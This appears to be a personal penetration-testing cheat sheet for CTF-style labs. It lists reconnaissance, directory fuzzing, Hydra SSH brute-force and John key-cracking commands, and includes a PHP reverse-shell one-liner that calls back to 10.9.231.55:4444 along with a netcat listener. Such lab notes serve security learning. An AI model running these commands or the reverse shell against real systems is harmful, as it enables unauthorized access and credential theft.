# Exploration

## Server

Scan for open ports  
`nmap -A 10.10.116.134`

## Samba

Get Information about samba  
`enum4linux -a 10.10.116.134`

Connect to anonymous samba share  
`smbclient //10.10.116.134/Anonymous`

## Webserver

Seclists: <https://github.com/danielmiessler/SecLists>

### Custom wordlists

[CeWL](https://tools.kali.org/password-attacks/cewl) is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.

### Directory scanning

`gobuster dir -u http://10.10.154.87:3333 -w /home/kali/Downloads/big.txt`

`wfuzz -c -z file,wordlist.txt -u http://10.10.218.20/api/site-log.php?date=FUZZ`

`wfuzz -c -z file,big.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.xyz/api.php`

`wfuzz -c -z file,big.txt -u http://shibes.xyz/api.php?breed=FUZZ`

`./ffuf -u http://s3.bucket.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`

`dirb http://10.10.144.50 big.txt`

# Brute Force

## SSH

SSH Brutefrce with hydra  
`hydra -t 4 -V -f -l jan -P /home/kali/Downloads/rockyou.txt 10.10.116.134 ssh`

Crack ssh key: Convert id_rsa for john and the crack it with wordlist  
`python3 /usr/share/john/ssh2john.py id_rsa > idcrack`  
`john --wordlist=rockyou.txt idcrack`

# Exploitation

## Search for exploits

Search in exploit db for wordpress  
`searchsploit wordpress`

## Reverse shell

### Reverse shells

[Netcat without e](https://medium.com/@shadowslayerqwerty/creating-a-netcat-reverse-shell-without-e-89b45134de99)

`<?php $sock=fsockopen("10.9.231.55",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>`

### Incoming reverse shell

`nc -nvlp <port>`

### Upgrading reverse shell

[Upgrading from netcat with magic](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

# Priviledge escalation

[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) is a script that search for possible paths to escalate privileges on Linux/Unix* hosts

[LinEnum](https://github.com/rebootuser/LinEnum)

List sudo rights  
`sudo -l`

setuid-Bit
`find . -perm /4000`

# Post Exploitation

Bash History
~/bash_history ~/zsh_history

# Useful tools

Local webserver from current directory  
`python3 -m http.server 8080`

Pipe through grep and write resuls to file  
`cat <file> | grep -e "dir" > result.txt`  

View & edit Path variable  
<https://www.baeldung.com/linux/path-variable>  
`echo $PATH`  
`export PATH=/some/new/path:$PATH`  

[Cyberchef](https://gchq.github.io/CyberChef/) - Encoding, Cryto and other string operations

# Legende

_kursiv_
**fett**
~~durchgestrichen~~
`code`

---

Liste:

* Eintrag
* Noch einer

Liste:

1. asdf
2. asf

[Link](http://example.com)

> Quote
